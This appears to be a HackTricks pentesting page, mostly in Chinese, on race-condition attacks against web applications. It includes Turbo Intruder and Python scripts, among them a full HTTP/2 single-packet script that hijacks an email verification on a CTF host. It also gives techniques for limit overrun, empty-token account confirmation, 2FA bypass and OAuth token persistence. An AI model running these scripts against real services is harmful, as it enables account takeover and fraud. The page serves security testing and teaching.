# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> 为深入理解此技术，请查看原始报告 [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## 增强 Race Condition 攻击

利用 race conditions 的主要难点是确保多个请求在同一时间被处理，而且它们的 **处理时间差异非常小——理想情况下小于 1ms**。

下面是一些用于同步请求的技术：

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**：支持在单个 TCP 连接上发送两个请求，从而减少网络抖动的影响。但由于服务器端差异，两次请求可能不足以稳定触发 race condition exploit。
- **HTTP/1.1 'Last-Byte Sync'**：允许预发送 20-30 个请求的大部分内容，仅保留一个小片段，然后同时发送该片段，从而实现请求同时到达服务器。

**Last-Byte Sync 的准备工作包括：**

1. 发送请求头和主体数据，省略最后一个字节且不结束流。
2. 在初次发送后暂停 100ms。
3. 禁用 TCP_NODELAY 以利用 Nagle's algorithm 对最终帧进行批量处理。
4. 通过 ping 来预热连接。

随后发送被保留的帧应会在单个数据包中到达，可通过 Wireshark 验证。该方法不适用于静态文件，静态文件通常不涉及 RC attacks。

### 适应服务器架构

理解目标的架构至关重要。前端服务器可能以不同方式路由请求，从而影响时序。通过无关紧要的请求进行服务器端的预热连接，可能会使请求时序更为一致。

#### 处理基于会话的锁定

像 PHP 的 session handler 这样的框架会按会话对请求进行序列化，可能掩盖漏洞。对每个请求使用不同的 session token 可以规避此问题。

#### 克服速率或资源限制

如果连接预热无效，通过大量无害请求触发 web 服务器的速率或资源限制延迟，可能会通过引起服务器端延迟来促成 single-packet attack。

## 攻击示例

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**：你可以将请求发送到 **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`)，在请求中修改要对 **`%s`** 进行 brute force 的值，例如 `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s`，然后从下拉菜单选择 **`examples/race-single-packer-attack.py`**：

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

如果你要 **发送不同的值**，可以用这个修改后的代码，它使用来自剪贴板的 wordlist：
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> 如果网站不支持 HTTP2（仅 HTTP1.1），请使用 `Engine.THREADED` 或 `Engine.BURP` 而不是 `Engine.BURP2`。

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: 在需要先向 1 个 endpoint 发送请求，然后向其他多个 endpoint 发送请求以触发 RCE 的情况下，你可以修改 `race-single-packet-attack.py` 脚本为如下内容：
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- 它也可以在 **Repeater** 中通过 Burp Suite 的新 '**Send group in parallel**' 选项使用。
- 对于 **limit-overrun**，你可以在组里添加 **相同的请求 50 次**。
- 对于 **connection warming**，你可以在 **组** 的 **开始** **添加** 一些 **请求** 到 web 服务器的某个非静态部分。
- 对于 **delaying** 进程在 **一个请求与另一个请求之间** 的 2 个子状态步骤，你可以 **在两个请求之间添加额外的请求**。
- 对于 **multi-endpoint** RC，你可以开始发送 **请求**，该 **进入隐藏状态**，然后在其之后紧接着发送 **50 个请求** 来 **利用隐藏状态**。

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: The goal of this script is to change the email of a user while continually verifying it until the verification token of the new email arrives to the last email (this is because in the code it was seeing a RC where it was possible to modify an email but have the verification sent to the old one because the variable indicating the email was already populated with the first one).\
当在收到的邮件中找到单词 "objetivo" 时，我们就知道收到了已更改邮箱的验证令牌，攻击结束。
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Improving Single Packet Attack

在最初的研究中说明该攻击受限于 1,500 bytes。然而，在 [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)，解释了如何通过使用 IP layer fragmentation 将 single packet attack 的 1,500-byte 限制扩展到 TCP 的 **65,535 B window limitation**（将单个数据包拆分为多个 IP 包）并以不同顺序发送，从而在所有碎片到达服务器之前阻止重组。该技术使研究者能够在大约 166ms 内发送 10,000 个请求。

注意，尽管此改进使在需要数百/数千个数据包同时到达的 RC 中攻击更可靠，但它也可能受到一些软件限制。一些流行的 HTTP 服务器如 Apache、Nginx 和 Go 对 `SETTINGS_MAX_CONCURRENT_STREAMS` 的设置非常严格，分别为 100、128 和 250。然而，像 NodeJS 和 nghttp2 则是无限制的。\
这基本上意味着 Apache 只会从单个 TCP 连接中考虑 100 个 HTTP 连接（限制了此 RC 攻击）。

你可以在仓库中找到使用该 technique 的一些示例：[https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main)。

## Raw BF

在上述研究之前，有一些 payloads 会尽可能快地发送包以触发 RC。

- **Repeater:** 请查看前一节的示例。
- **Intruder**: 将 **request** 发送到 **Intruder**，在 **Options menu** 中将 **number of threads** 设置为 **30**，选择作为 payload 的 **Null payloads** 并生成 **30**。
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC 方法论**

### 超限 / TOCTOU

这是最基本的一类 race condition，发生在那些对可执行某个操作次数进行限制的地方出现 **漏洞**。比如在网店中多次使用同一个折扣码。一个非常简单的例子可以在 [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) 或 [**this bug**](https://hackerone.com/reports/759247) 中看到。

这类攻击有许多变体，包括：

- 多次兑换同一张礼品卡
- 多次为同一产品评分
- 提取或转账导致超出账户余额
- 复用单次 CAPTCHA 的解答
- 绕过 anti-brute-force rate limit

### **隐藏的子状态**

利用复杂的 race conditions 通常涉及利用短暂机会与隐藏或 **非预期的机器子状态** 交互。下面是应对思路：

1. **识别潜在的隐藏子状态**
- 从定位那些修改或与关键数据交互的端点开始，例如用户资料或密码重置流程。关注：
- **Storage**：优先选择操作服务器端持久数据的端点，而不是仅处理客户端数据的端点。
- **Action**：寻找修改现有数据的操作，这类操作比添加新数据的操作更可能产生可利用的条件。
- **Keying**：成功的攻击通常涉及基于相同标识符（例如 username 或 reset token）的操作。
2. **进行初步探测**
- 对识别出的端点进行 race condition 测试，观察是否有与预期结果不符的情况。意外的响应或应用行为变化都可能表明存在漏洞。
3. **证明漏洞**
- 将攻击缩小到利用漏洞所需的最少请求数，通常只需两次请求。由于时序要求精确，这一步可能需要多次尝试或自动化。

### 时间敏感攻击

精确控制请求时序可以揭示漏洞，尤其是在使用可预测方法（如基于时间戳）生成 security tokens 时。例如，如果基于时间戳生成 password reset tokens，可能会导致同时请求时生成相同的 tokens。

**利用方式：**

- 使用精确的时序（比如 single packet attack）同时发起 password reset 请求。若生成相同的 tokens，则表明存在漏洞。

**示例：**

- 同时请求两个 password reset tokens 并进行比较。匹配的 tokens 表明 token 生成存在缺陷。

可以到 [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) 试试。

## 隐藏子状态案例研究

### 支付并添加一个商品

到 [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) 查看如何在商店中 **支付** 并 **添加额外** 的商品，从而 **无需为其付款**。

### 确认其他邮箱

思路是同时 **验证某个邮箱并将其更改为另一个邮箱**，以判断平台是否会验证更改后的新邮箱。

### 基于 Cookie 将邮箱改为两个地址

根据 [**this research**](https://portswigger.net/research/smashing-the-state-machine)，Gitlab 曾可通过这种方式被接管，因为它可能会 **将一个邮箱的 email verification token 发送到另一个邮箱**。

到 [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) 试试。

### 隐藏的数据库状态 / 确认绕过

如果使用 **2 different writes** 向 **database** 中 **添加** **信息**，会存在一小段时间窗口，期间 **只有第一份数据已被写入**。例如，在创建用户时，**username** 和 **password** 可能先被 **写入**，然后用于确认新账号的 **token** 才被写入。这意味着在短时间内，**用于确认账号的 token 为空**。

因此，**注册一个账号并立即发送多次带空 token 的请求**（`token=` 或 `token[]=` 或其他变体）来确认该账号，可能允许**确认一个你不控制其邮箱的账号**。

到 [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) 试试。

### 绕过 2FA

下面的伪代码易受 race condition 攻击，因为在极短时间内，在创建会话时 **2FA 未被强制执行**：
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 永久持久化

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). 这些服务允许你创建一个应用并对提供者已注册的用户进行认证。为此，**client** 将需要 **permit your application** 去访问 **OAUth provider** 内的部分数据。\
So, until here just a common login with google/linkedin/github... where you are prompted with a page saying: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

当你**accept it** 时问题出现，系统会自动向恶意应用发送一个 **`authorization_code`**。然后，该 **application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT** (_Authentication Token/Refresh Token_) from the **`authorization_code`** 用于你的账户。基本上，它会利用你允许该应用访问你数据的事实来**create several accounts**。之后，如果你**stop allowing the application to access your data one pair of AT/RT will be deleted, but the other ones will still be valid**，某些 AT/RT 仍可能保持有效。

#### Race Condition in `Refresh Token`

一旦你**obtained a valid RT**，你可能尝试**abuse it to generate several AT/RT**；即使用户撤销了对该恶意应用的权限，**several RTs will still be valid.**

## **RC in WebSockets**

- 在 [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) 你可以找到一个 Java PoC，用于并行发送 websocket 消息以滥用 **Race Conditions also in Web Sockets**（参见仓库）。
- 使用 Burp’s WebSocket Turbo Intruder 你可以使用 **THREADED** 引擎来生成多个 WS 连接并并行触发 payloads。请从官方示例开始并调整 `config()`（线程数）以获得并发性；在跨 WS handler 竞争服务器端状态时，这通常比在单个连接上批量发送更可靠。参见 [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)。

## 参考资料

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
